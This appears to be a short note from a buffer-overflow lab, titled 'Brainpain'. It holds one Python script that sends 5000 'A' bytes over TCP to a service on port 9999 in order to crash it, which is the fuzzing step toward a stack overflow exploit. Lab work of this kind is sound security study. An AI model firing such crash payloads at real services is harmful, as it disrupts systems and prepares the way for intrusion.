# Brainpain

## Initial Crash

```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 5000  # change me

payload = b"A" * CRASH_LEN

with socket.create_connection(target) as sock:
    sock.recv(512) 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")

```
